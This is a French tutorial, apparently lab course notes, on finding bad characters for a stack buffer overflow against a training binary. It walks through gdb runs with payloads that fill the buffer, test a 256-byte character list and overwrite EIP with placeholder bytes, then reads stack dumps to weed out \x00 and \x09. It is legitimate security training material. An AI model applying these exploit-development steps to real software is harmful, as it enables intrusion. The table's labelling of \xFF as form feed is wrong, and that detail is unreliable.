# Identification des Mauvais Caractères

***

Auparavant, dans les systèmes d’exploitation de type UNIX, les binaires commençaient par deux octets contenant un **« nombre magique » (magic number)** qui détermine le type de fichier.\
Au début, cela servait à identifier les fichiers objets pour différentes plateformes.\
Progressivement, ce concept a été transféré à d’autres fichiers, et maintenant presque tous les fichiers contiennent un nombre magique.

De tels caractères réservés existent également dans les applications, mais ils n’apparaissent pas toujours et ne sont pas toujours les mêmes.\
Ces caractères réservés, aussi appelés **mauvais caractères (bad characters)**, peuvent varier, mais souvent nous verrons des caractères comme ceux-ci :

```asm
\x00 - Octet nul
\x0A - Saut de ligne
\x0D - Retour chariot
\xFF - Form Feed
```

Ici, nous utilisons la liste de caractères suivante pour découvrir tous les caractères que nous devons considérer et éviter lors de la génération de notre shellcode.

***

### <mark style="color:red;">**Liste de Caractères**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot_1@htb[/htb]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
{% endcode %}

Pour calculer le nombre d’octets dans notre variable `CHARS`, nous pouvons utiliser **bash** en remplaçant `\x` par un espace, puis utiliser `wc` pour compter les mots.

***

### <mark style="color:green;">**Calculer la longueur de CHARS**</mark>

```bash
mrroboteLiot_1@htb[/htb]$ echo $CHARS | sed 's/\\x/ /g' | wc -w
```

Résultat :

```
256
```

Cette chaîne fait **256 octets**. Nous devons donc recalculer notre buffer.

***

### <mark style="color:red;">**Notes**</mark>

```asm
Buffer  = "\x55" * (1040 - 256 - 4) = 780
CHARS   = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
EIP     = "\x66" * 4
```

***

Maintenant, regardons la fonction `main` complète.\
Si nous l’exécutons maintenant, le programme va crasher sans nous donner la possibilité de suivre ce qui se passe en mémoire.\
Donc, nous allons définir un **breakpoint** à la fonction correspondante afin que l’exécution s’arrête à ce point, et nous puissions analyser le contenu de la mémoire.

***

### <mark style="color:red;">**GDB**</mark>

Désassemblage de `main` :

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x56555582 <+0>:    lea    ecx,[esp+0x4]
   0x56555586 <+4>:    and    esp,0xfffffff0
   0x56555589 <+7>:    push   DWORD PTR [ecx-0x4]
   0x5655558c <+10>:   push   ebp
   0x5655558d <+11>:   mov    ebp,esp
   0x5655558f <+13>:   push   ebx
   0x56555590 <+14>:   push   ecx
   0x56555591 <+15>:   call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555596 <+20>:   add    ebx,0x1a3e
   0x5655559c <+26>:   mov    eax,ecx
   0x5655559e <+28>:   mov    eax,DWORD PTR [eax+0x4]
   0x565555a1 <+31>:   add    eax,0x4
   0x565555a4 <+34>:   mov    eax,DWORD PTR [eax]
   0x565555a6 <+36>:   sub    esp,0xc
   0x565555a9 <+39>:   push   eax
   0x565555aa <+40>:   call   0x5655554d <bowfunc>   # <---- Fonction bowfunc
   ...
```

***

### <mark style="color:red;">**Définir le breakpoint**</mark>

```gdb
(gdb) break bowfunc
Breakpoint 1 at 0x56555551
```

***

### <mark style="color:red;">**Exécuter avec CHARS**</mark>

{% code fullWidth="true" %}
```gdb
(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```
{% endcode %}

⚠️ Avertissement bash :

```
/bin/bash: warning: command substitution: ignored null byte in input
```

***

### <mark style="color:red;">**Analyse de la pile**</mark>

On inspecte la mémoire :

```gdb
(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				 # |---> "\x55"s begin

0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

```asm
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
                                                        # |---> CHARS begin

0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

On observe que le buffer commence bien avec nos `\x55`, puis qu’à l’endroit prévu pour `CHARS`, le premier octet `\x00` a été ignoré → donc la séquence commence par `\x01`.

Cela confirme que **\x00 est un mauvais caractère**.\
Il doit être retiré de la liste, et la taille du buffer doit être ajustée.

***

### <mark style="color:red;">**Exemple de correction**</mark>

```
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 255 - 4) = 781

# "\x00" removed: 256 - 1 = 255 bytes
 CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
 
   EIP = "\x66" * 4
```

Ensuite, on relance et on répète le processus.\
Chaque fois qu’on trouve un caractère problématique (comme ici `\x00` puis `\x09`, etc.), on le retire de la liste et on adapte la taille du buffer.

⚠️ Ce processus doit être répété **jusqu’à ce que tous les mauvais caractères soient identifiés et éliminés**.

{% code fullWidth="true" %}
```asm
(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```
{% endcode %}

***

{% code fullWidth="true" %}
```
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
                                                        # |----| <- "\x09" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```
{% endcode %}

{% code fullWidth="true" %}
```
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 254 - 4) = 782	

# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```
{% endcode %}

<mark style="color:green;">Send CHARS - Without "\x00" & "\x09"</mark>

{% code fullWidth="true" %}
```sh
(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```
{% endcode %}
